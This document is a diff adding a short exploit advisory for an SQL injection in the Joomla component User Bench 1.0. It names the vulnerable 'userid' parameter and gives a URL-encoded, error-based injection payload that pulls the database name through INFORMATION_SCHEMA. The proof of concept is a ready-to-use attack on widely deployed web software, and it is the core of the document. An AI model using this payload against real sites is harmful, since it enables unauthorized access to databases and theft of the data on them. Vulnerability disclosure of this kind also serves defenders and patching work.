@@ -1,0 +1,26 @@
+# # # # #
+# Exploit Title: Joomla! Component User Bench 1.0 - SQL Injection
+# Dork: N/A
+# Date: 18.12.2017
+# Vendor Homepage: http://www.gegabyte.org/
+# Software Link: https://extensions.joomla.org/extensions/extension/directory-a-documentation/directory/user-bench/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_userbench&view=detail&userid=[SQL]
+#  
+# %20AND(SELECT%201%20FROM%20(SELECT%20COUNT(*)%2cCONCAT((SELECT(SELECT%20CONCAT(CAST(DATABASE()%20AS%20CHAR)%2c0x7e%2c0x496873616e53656e63616e))%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema=DATABASE()%20LIMIT%200%2c1)%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)
+# 
+# # # # #
